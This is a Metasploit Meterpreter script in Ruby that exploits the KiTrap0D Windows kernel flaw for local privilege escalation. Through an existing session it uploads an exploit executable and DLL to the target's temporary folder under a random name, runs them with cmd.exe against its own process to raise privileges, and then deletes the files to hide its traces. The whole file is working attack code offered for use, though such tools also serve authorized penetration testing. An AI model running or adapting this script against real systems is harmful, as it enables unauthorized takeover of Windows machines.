# $Id$

#
# Meterpreter script for exploiting the KiTrap0D flaw
# using Tavis Ormandy's PoC
#

session = client

#
# Options
#
opts = Rex::Parser::Arguments.new(
	"-h"  => [ false,  "This help menu"]
)


#
# Option parsing
#
opts.parse(args) do |opt, idx, val|
	case opt
	when "-h"
		print_line(opts.usage)
		raise Rex::Script::Completed
	end
end


# Exec a command and return the results
def m_exec(session, cmd)
	r = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
	b = ""
	while(d = r.channel.read)
		b << d
	end
	r.channel.close
	r.close
	b
end

print_status("Currently running as " + client.sys.config.getuid)
print_line("")

print_status("Loading the vdmallowed executable and DLL from the local system...")
based = ::File.join(Msf::Config.install_root, "data", "exploits", "kitrap0d")
exp   = ::File.join(based, "vdmallowed.exe")
dll   = ::File.join(based, "vdmexploit.dll")

expdata = ""
::File.open(exp, "rb") do |fd|
	expdata = fd.read(fd.stat.size)
end

dlldata = ""
::File.open(dll, "rb") do |fd|
	dlldata = fd.read(fd.stat.size)
end

tempdir = client.fs.file.expand_path("%TEMP%")
tempexe = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
print_status("Uploading vdmallowed to #{tempexe}...")
fd = client.fs.file.new(tempexe, "wb")
fd.write(expdata)
fd.close

tempdir = client.fs.file.expand_path("%TEMP%")
tempdll = tempdir + "\\" + "vdmexploit.dll"
print_status("Uploading vdmallowed to #{tempdll}...")
fd = client.fs.file.new(tempdll, "wb")
fd.write(dlldata)
fd.close

server = client.sys.process.open

print_status("Escalating our process (PID:#{server.pid})...")
print_line("")

tempdrive = tempdir.split(':')[0]
data = m_exec(client, "cmd.exe /c #{tempdrive}: & cd \"#{tempdir}\" & #{tempexe} #{server.pid}")
print_line(data)

print_status("Deleting files...")
client.fs.file.rm(tempexe)
client.fs.file.rm(tempdll)

print_status("Now running as " + client.sys.config.getuid)

